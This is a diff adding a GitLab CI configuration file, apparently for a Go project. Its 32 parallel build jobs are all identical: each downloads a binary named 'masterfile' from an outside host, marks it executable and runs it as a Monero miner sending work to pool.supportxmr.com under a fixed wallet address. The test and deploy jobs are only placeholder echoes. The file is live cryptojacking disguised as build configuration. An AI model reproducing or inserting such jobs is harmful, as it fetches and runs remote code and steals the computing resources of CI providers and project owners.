@@ -1,0 +1,179 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/(setiap grup gonta ganti )
+
+stages:
+  - test
+  - build
+  - deploy
+
+test:
+  stage: test
+  script:
+    - echo "Let's Begin"
+
+build_a:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_b:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_c:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_d:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_e:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_f:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_g:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_h:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_i:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_j:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_k:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_l:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_m:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_n:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_o:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_p:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_q:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_r:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_s:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_t:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_u:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_v:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_w:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_x:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_y:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_z:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_ab:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_ac:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_ad:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_ae:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_af:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+build_ag:
+  stage: build
+  script:
+     - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile --donate-level 1 -o pool.supportxmr.com:443 -u 83usowazr3W2cLLGfAfxd4j9zMKDTx2Xzbp9ZGkEvgEn6wuFxcRZP4Ccwm8CX1uQPXPAUFaC1cv6n5JSFH9gojPh13VtAKT -k --tls -p XTC -t2
+
+deploy-prod:
+  stage: deploy
+  script:
+    - echo "This job deploys something from the .gitlab-ci.yml" 
